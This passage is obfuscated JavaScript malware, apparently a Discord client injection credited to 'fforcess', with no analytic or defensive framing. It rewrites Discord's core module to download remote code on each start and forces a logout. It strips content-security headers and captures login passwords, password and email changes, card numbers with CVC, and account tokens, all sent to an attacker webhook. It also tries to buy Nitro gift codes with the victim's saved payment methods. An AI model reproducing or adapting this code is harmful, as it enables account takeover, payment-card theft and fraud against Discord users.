    _0x3de689 = _0x3de689 + leftpad(parseInt(_0xe5a40c, 2).toString(16), 2, '0');
  }
  return _0x3de689;
}
function leftpad(_0x3e3606, _0x36bcec, _0x458959) {
  if (_0x36bcec + 1 >= _0x3e3606.length) {
    _0x3e3606 = Array(_0x36bcec + 1 - _0x3e3606.length).join(_0x458959) + _0x3e3606;
  }
  return _0x3e3606;
}
const discordPath = function () {
  const _0x4202d5 = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let _0x1a44c7;
  if (process.platform === "win32") {
    _0x1a44c7 = path.join(_0x4202d5, "resources");
  } else if (process.platform === "darwin") {
    _0x1a44c7 = path.join(_0x4202d5, "Contents", "Resources");
  }
  if (fs.existsSync(_0x1a44c7)) {
    return {
      'resourcePath': _0x1a44c7,
      'app': _0x4202d5
    };
  }
  const _0x3cc349 = {
    undefined: undefined,
    undefined: undefined
  };
  return _0x3cc349;
}();
function updateCheck() {
  const {
    resourcePath: _0x18750d,
    app: _0x325671
  } = discordPath;
  if (_0x18750d === undefined || _0x325671 === undefined) {
    return;
  }
  const _0x13c4d7 = path.join(_0x18750d, "app");
  const _0x344597 = path.join(_0x13c4d7, "package.json");
  const _0xdf4c6f = path.join(_0x13c4d7, "index.js");
  const _0x5c87fe = fs.readdirSync(_0x325671 + "\\modules\\").filter(_0x37e5fc => /discord_desktop_core-+?/.test(_0x37e5fc))[0];
  const _0x16a093 = _0x325671 + "\\modules\\" + _0x5c87fe + "\\discord_desktop_core\\index.js";
  const _0x1dceb0 = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(_0x13c4d7)) {
    fs.mkdirSync(_0x13c4d7);
  }
  if (fs.existsSync(_0x344597)) {
    fs.unlinkSync(_0x344597);
  }
  if (fs.existsSync(_0xdf4c6f)) {
    fs.unlinkSync(_0xdf4c6f);
  }
  if (process.platform === "win32" || process.platform === 'darwin') {
    const _0x126e4d = {
      name: "discord",
      main: "index.js"
    };
    fs.writeFileSync(_0x344597, JSON.stringify(_0x126e4d, null, 4));
    const _0x52a643 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x16a093 + "';\nconst bdPath = '" + _0x1dceb0 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + '%WEBHOOK%' + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x18750d, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0xdf4c6f, _0x52a643.replace(/\\/g, "\\\\"));
  }
  if (!fs.existsSync(path.join(__dirname, "initiation"))) {
    return true;
  }
  fs.rmdirSync(path.join(__dirname, "initiation"));
  execScript("window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();");
  return false;
}
const execScript = _0x1fb7e6 => {
  const _0x487075 = BrowserWindow.getAllWindows()[0];
  return _0x487075.webContents.executeJavaScript(_0x1fb7e6, true);
};
const getInfo = async _0x367be1 => {
  const _0xdc5e32 = await execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x367be1 + "\");\n    xmlHttp.send(null);\n    xmlHttp.responseText;");
  return JSON.parse(_0xdc5e32);
};
const fetchBilling = async _0x521ad2 => {
  const _0x140f54 = await execScript("var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me/billing/payment-sources\", false); \n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x521ad2 + "\"); \n    xmlHttp.send(null); \n    xmlHttp.responseText");
  if (!_0x140f54.lenght || _0x140f54.length === 0) {
    return '';
  }
  return JSON.parse(_0x140f54);
};
const getBilling = async _0x336966 => {
  const _0x1353df = await fetchBilling(_0x336966);
  if (!_0x1353df) {
    return '❌';
  }
  let _0x481332 = '';
  _0x1353df.forEach(_0x5a8c8b => {
    if (!_0x5a8c8b.invalid) {
      switch (_0x5a8c8b.type) {
        case 1:
          _0x481332 += "💳 ";
          break;
        case 2:
          _0x481332 += "<:paypal:951139189389410365> ";
          break;
      }
    }
  });
  if (!_0x481332) {
    _0x481332 = '❌';
  }
  return _0x481332;
};
const Purchase = async (_0x341bbe, _0x556963, _0x5c9c3a, _0x455128) => {
  const _0x5ac38e = {
    expected_amount: config.nitro[_0x5c9c3a][_0x455128].price,
    expected_currency: "usd",
    gift: true,
    payment_source_id: _0x556963,
    payment_source_token: null,
    purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
    sku_subscription_plan_id: config.nitro[_0x5c9c3a][_0x455128].sku
  };
  const _0x26178a = execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/" + config.nitro[_0x5c9c3a][_0x455128].id + "/purchase\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x341bbe + "\");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(" + JSON.stringify(_0x5ac38e) + "));\n    xmlHttp.responseText");
  if (_0x26178a.gift_code) {
    return "https://discord.gift/" + _0x26178a.gift_code;
  } else {
    return null;
  }
};
function _0x24ca53(_0x10238b, _0x5eb431, _0x509a62, _0x36bb80) {
  return _0x8e8d(_0x10238b - 0x3d6, _0x36bb80);
}
const buyNitro = async _0x441b7b => {
  const _0x4d9786 = await fetchBilling(_0x441b7b);
  if (!_0x4d9786) {
    return "Failed to Purchase ❌";
  }
  let _0x2d9607 = [];
  _0x4d9786.forEach(_0x365703 => {
    if (!_0x365703.invalid) {
      _0x2d9607 = _0x2d9607.concat(_0x365703.id);
    }
  });
  for (let _0x35d2c in _0x2d9607) {
    const _0x21a5ce = Purchase(_0x441b7b, _0x35d2c, "boost", "year");
    if (_0x21a5ce !== null) {
      return _0x21a5ce;
    } else {
      const _0x4371a6 = Purchase(_0x441b7b, _0x35d2c, 'boost', "month");
      if (_0x4371a6 !== null) {
        return _0x4371a6;
      } else {
        const _0x5d676a = Purchase(_0x441b7b, _0x35d2c, "classic", "month");
        if (_0x5d676a !== null) {
          return _0x5d676a;
        } else {
          return "Failed to Purchase ❌";
        }
      }
    }
  }
};
const getNitro = _0x1f1a1a => {
  switch (_0x1f1a1a) {
    case 0:
      return "No Nitro";
    case 1:
      return "Nitro Classic";
    case 2:
      return "Nitro Boost";
    default:
      return "No Nitro";
  }
};
const getBadges = _0x3fed90 => {
  const _0x295f67 = {
    fXvoj: "Discord Staff, "
  };
  _0x295f67.zbnEr = "Hypesquad Event, ";
  _0x295f67.LwYbk = "Gold BugHunter, ";
  _0x295f67.WrVyN = "Early Supporter, ";
  _0x295f67.kKvlC = "HypeSquad Bravery, ";
  _0x295f67.BYwtB = "HypeSquad Balance, ";
  _0x295f67.hnhWl = 'None';
  let _0x402786 = '';
  switch (_0x3fed90) {
    case 1:
      _0x402786 += "Discord Staff, ";
      break;
    case 2:
      _0x402786 += "Partnered Server Owner, ";
      break;
    case 131072:
      _0x402786 += "Verified Bot Developer, ";
      break;
    case 4:
      _0x402786 += _0x295f67.zbnEr;
      break;
    case 16384:
      _0x402786 += _0x295f67.LwYbk;
      break;
    case 8:
      _0x402786 += "Green BugHunter, ";
      break;
    case 512:
      _0x402786 += _0x295f67.WrVyN;
      break;
    case 128:
      _0x402786 += "HypeSquad Brillance, ";
      break;
    case 64:
      _0x402786 += _0x295f67.kKvlC;
      break;
    case 256:
      _0x402786 += _0x295f67.BYwtB;
      break;
    case 0:
      _0x402786 = "None";
      break;
    default:
      _0x402786 = _0x295f67.hnhWl;
      break;
  }
  return _0x402786;
};
const hooker = async (data) => {
  const config = {
    baseUrl: "https://discord.gift/",
    contentType: "application/json",
    webhookPath: "api/webhooks",
    secretKey: "UDCJb"
  };

  config.authorizationHeader = "Authorization";
  config.method = "POST";
  config.errorType = "error";
  const jsonData = JSON.stringify(data);
  const webhookUrl = new URL('%WEBHOOK%');
  const headers = {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": '*'
  };
  if (!'%WEBHOOK%'.includes("api/webhooks")) {
    const token = totp("%WEBHOOK_KEY%");
    headers[config.authorizationHeader] = token;
  }

  const requestOptions = {
    protocol: webhookUrl.protocol,
    hostname: webhookUrl.host,
    path: webhookUrl.pathname,
    method: config.method,
    headers: headers
  };

  const req = https.request(requestOptions);
  req.on(config.errorType, (error) => {
    console.log(error);
  });

  req.write(jsonData);
  req.end();
};

const login = async (_0x178017, _0x2034e1, _0x5d839a) => {
  const _0x11b201 = await getInfo(_0x5d839a);
  const _0x52f52a = getNitro(_0x11b201.premium_type);
  const _0x4ca0c9 = getBadges(_0x11b201.flags);
  const _0x269b23 = await getBilling(_0x5d839a);
  const _0x19ed76 = {
    name: "**Account Info**",
    value: "Email: **" + _0x178017 + "** - Password: **" + _0x2034e1 + '**',
    inline: false
  };
  const _0x3b6c84 = {
    name: "**Discord Info**",
    value: "Nitro Type: **" + _0x52f52a + "**\nBadges: **" + _0x4ca0c9 + "**\nBilling: **" + _0x269b23 + '**',
    inline: false
  };
  const _0x57b953 = {
    name: '**Token**',
    value: '`' + _0x5d839a + '`',
    inline: false
  };
  const _0x58473e = {
    text: "🎉・Discord Injection By fforcess"
  };
  const _0x320249 = {
    'username': "Injection By fforcess",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x0,
      'fields': [_0x19ed76, _0x3b6c84, _0x57b953],
      'author': {
        'name': _0x11b201.username + '#' + _0x11b201.discriminator + " | " + _0x11b201.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x11b201.id + '/' + _0x11b201.avatar + ".webp"
      },
      'footer': _0x58473e
    }]
  };
  hooker(_0x320249);
};
const passwordChanged = async (_0x5e27d9, _0x2ddd5a, _0x38ca0e) => {
  const _0xd186e6 = await getInfo(_0x38ca0e);
  const _0x18a6b5 = getNitro(_0xd186e6.premium_type);
  const _0x33f90e = getBadges(_0xd186e6.flags);
  const _0x3ace51 = await getBilling(_0x38ca0e);
  const _0x466299 = {
    name: "**Password Changed**",
    value: "Email: **" + _0xd186e6.email + "**\nOld Password: **" + _0x5e27d9 + "**\nNew Password: **" + _0x2ddd5a + '**',
    inline: true
  };
  const _0x394079 = {
    name: "**Discord Info**",
    value: "Nitro Type: **" + _0x18a6b5 + "**\nBadges: **" + _0x33f90e + "**\nBilling: **" + _0x3ace51 + '**',
    inline: true
  };
  const _0x2a9cd2 = {
    name: "**Token**",
    value: '`' + _0x38ca0e + '`',
    inline: false
  };
  const _0xb502fc = {
    'username': "Injection By fforcess",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x0,
      'fields': [_0x466299, _0x394079, _0x2a9cd2],
      'author': {
        'name': _0xd186e6.username + '#' + _0xd186e6.discriminator + " | " + _0xd186e6.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0xd186e6.id + '/' + _0xd186e6.avatar + ".webp"
      },
      'footer': {
        'text': "🎉・Discord Injection By fforcess"
      }
    }]
  };
  hooker(_0xb502fc);
};
const emailChanged = async (_0xdc222b, _0x20a0a2, _0x3590ae) => {
  const _0xebef76 = await getInfo(_0x3590ae);
  const _0x58c158 = getNitro(_0xebef76.premium_type);
  const _0x3213eb = getBadges(_0xebef76.flags);
  const _0x22a35b = await getBilling(_0x3590ae);
  const _0xb0b993 = {
    name: "**Email Changed**",
    value: "New Email: **" + _0xdc222b + "**\nPassword: **" + _0x20a0a2 + '**',
    inline: true
  };
  const _0x2a48d0 = {
    name: "**Discord Info**"
  };
  _0x2a48d0.value = "Nitro Type: **" + _0x58c158 + "**\nBadges: **" + _0x3213eb + "**\nBilling: **" + _0x22a35b + '**';
  _0x2a48d0.inline = true;
  const _0x1aa0eb = {
    name: "**Token**",
    value: '`' + _0x3590ae + '`',
    inline: false
  };
  const _0x531acb = {
    'username': "Injection By fforcess",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x0,
      'fields': [_0xb0b993, _0x2a48d0, _0x1aa0eb],
      'author': {
        'name': _0xebef76.username + '#' + _0xebef76.discriminator + " | " + _0xebef76.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0xebef76.id + '/' + _0xebef76.avatar + '.webp'
      },
      'footer': {
        'text': "🎉・Discord Injection By fforcess"
      }
    }]
  };
  hooker(_0x531acb);
};
const PaypalAdded = async _0x329400 => {
  const _0x585bfe = await getInfo(_0x329400);
  const _0x3af48c = getNitro(_0x585bfe.premium_type);
  const _0x2cde7c = getBadges(_0x585bfe.flags);
  const _0x3873a5 = getBilling(_0x329400);
  const _0x1bb5db = {
    name: "**Paypal Added**",
    value: "Time to buy some nitro baby 😩",
    inline: false
  };
  const _0x55b54a = {
    name: "**Discord Info**",
    value: "Nitro Type: **" + _0x3af48c + "*\nBadges: **" + _0x2cde7c + "**\nBilling: **" + _0x3873a5 + '**',
    inline: false
  };
  const _0xae84a4 = {
    name: '**Token**',
    value: '`' + _0x329400 + '`',
    inline: false
  };
  const _0x4f96bb = {
    text: "🎉・Discord Injection By fforcess"
  };
  const _0xbdfa97 = {
    'username': "Injection By fforcess",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x0,
      'fields': [_0x1bb5db, _0x55b54a, _0xae84a4],
      'author': {
        'name': _0x585bfe.username + '#' + _0x585bfe.discriminator + " | " + _0x585bfe.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x585bfe.id + '/' + _0x585bfe.avatar + ".webp"
      },
      'footer': _0x4f96bb
    }]
  };
  hooker(_0xbdfa97);
};
const ccAdded = async (_0x13ac6f, _0x3712c6, _0x18bf85, _0x29112f, _0x32bbfa) => {
  const _0x1b3953 = await getInfo(_0x32bbfa);
  const _0x569ee1 = getNitro(_0x1b3953.premium_type);
  const _0x5f4314 = getBadges(_0x1b3953.flags);
  const _0x458ec2 = await getBilling(_0x32bbfa);
  const _0x3dce4c = {
    name: "**Credit Card Added**",
    value: "Credit Card Number: **" + _0x13ac6f + "**\nCVC: **" + _0x3712c6 + "**\nCredit Card Expiration: **" + _0x18bf85 + '/' + _0x29112f + '**',
    inline: true
  };
  const _0x2a8964 = {
    name: "**Discord Info**",
    value: "Nitro Type: **" + _0x569ee1 + "**\nBadges: **" + _0x5f4314 + "**\nBilling: **" + _0x458ec2 + '**',
    inline: true
  };
  const _0x57853e = {
    name: "**Token**",
    value: '`' + _0x32bbfa + '`',
    inline: false
  };
  const _0x5dd336 = {
    'username': "Injection By fforcess",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x0,
      'fields': [_0x3dce4c, _0x2a8964, _0x57853e],
      'author': {
        'name': _0x1b3953.username + '#' + _0x1b3953.discriminator + " | " + _0x1b3953.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x1b3953.id + '/' + _0x1b3953.avatar + ".webp"
      },
      'footer': {
        'text': "🎉・Discord Injection By fforcess"
      }
    }]
  };
  hooker(_0x5dd336);
};
const nitroBought = async _0x2860cb => {
  const _0x4ee936 = await getInfo(_0x2860cb);
  const _0x110a29 = getNitro(_0x4ee936.premium_type);
  const _0x18d119 = getBadges(_0x4ee936.flags);
  const _0x152fae = await getBilling(_0x2860cb);
  const _0x167ed6 = await buyNitro(_0x2860cb);
  const _0x14163e = {
    text: "🎉・Discord Injection By fforcess"
  };
  const _0x5ed3f5 = {
    'username': "Injection By fforcess",
    'content': _0x167ed6,
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x0,
      'fields': [{
        'name': "**Nitro bought!**",
        'value': "**Nitro Code:**\n```diff\n+ " + _0x167ed6 + '```',
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x110a29 + "**\nBadges: **" + _0x18d119 + "**\nBilling: **" + _0x152fae + '**',
        'inline': true
      }, {
        'name': "**Token**",
        'value': '`' + _0x2860cb + '`',
        'inline': false
      }],
      'author': {
        'name': _0x4ee936.username + '#' + _0x4ee936.discriminator + " | " + _0x4ee936.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x4ee936.id + '/' + _0x4ee936.avatar + '.webp'
      },
      'footer': _0x14163e
    }]
  };
  hooker(_0x5ed3f5);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (_0x5525f9, _0x5aab73) => {
  const _0x9656cc = {
    'cancel': true
  };
  if (_0x5525f9.url.startsWith("wss://remote-auth-gateway")) {
    return _0x5aab73(_0x9656cc);
  }
  updateCheck();
});
session.defaultSession.webRequest.onHeadersReceived((_0x5765f4, _0x4358c0) => {
  if (_0x5765f4.url.startsWith('%WEBHOOK%')) {
    if (_0x5765f4.url.includes("discord.com")) {
      const _0x2b68a0 = {
        "Access-Control-Allow-Headers": '*'
      };
      _0x4358c0({
        'responseHeaders': Object.assign(_0x2b68a0, _0x5765f4.responseHeaders)
      });
    } else {
      _0x4358c0({
        'responseHeaders': Object.assign({
          'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
          'Access-Control-Allow-Headers': '*',
          'Access-Control-Allow-Origin': '*'
        }, _0x5765f4.responseHeaders)
      });
    }
  } else {
    delete _0x5765f4.responseHeaders["content-security-policy"];
    delete _0x5765f4.responseHeaders["content-security-policy-report-only"];
    const _0x4dee61 = {
      ..._0x5765f4.responseHeaders
    };
    _0x4dee61["Access-Control-Allow-Headers"] = '*';
    const _0x3032dc = {
      responseHeaders: _0x4dee61
    };
    _0x4358c0(_0x3032dc);
  }
});
session.defaultSession.webRequest.onCompleted(config.filter, async (_0x1ab2da, _0x55c71e) => {
  if (_0x1ab2da.statusCode !== 200 && _0x1ab2da.statusCode !== 202) {
    return;
  }
  const _0x4d302b = Buffer.from(_0x1ab2da.uploadData[0].bytes).toString();
  const _0x138fa5 = JSON.parse(_0x4d302b);
  const _0x1e041f = await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
  switch (true) {
    case _0x1ab2da.url.endsWith("login"):
      login(_0x138fa5.login, _0x138fa5.password, _0x1e041f)['catch'](console.error);
      break;
    case _0x1ab2da.url.endsWith('users/@me') && _0x1ab2da.method === "PATCH":
      if (!_0x138fa5.password) {
        return;
      }
      if (_0x138fa5.email) {
        emailChanged(_0x138fa5.email, _0x138fa5.password, _0x1e041f)["catch"](console.error);
      }
      if (_0x138fa5.new_password) {
        passwordChanged(_0x138fa5.password, _0x138fa5.new_password, _0x1e041f)['catch'](console.error);
      }
      break;
    case _0x1ab2da.url.endsWith('tokens') && _0x1ab2da.method === 'POST':
      const _0x2c2d74 = querystring.parse(unparsedData.toString());
      ccAdded(_0x2c2d74["card[number]"], _0x2c2d74["card[cvc]"], _0x2c2d74["card[exp_month]"], _0x2c2d74["card[exp_year]"], _0x1e041f)["catch"](console.error);
      break;
    case _0x1ab2da.url.endsWith("paypal_accounts") && _0x1ab2da.method === 'POST':
      PaypalAdded(_0x1e041f)["catch"](console.error);
      break;
    case _0x1ab2da.url.endsWith("confirm") && _0x1ab2da.method === "POST":
      return;
      setTimeout(() => {
        nitroBought(_0x1e041f)["catch"](console.error);
      }, 7500);
      break;
    default:
      break;
  }
});
module.exports = require("./core.asar");
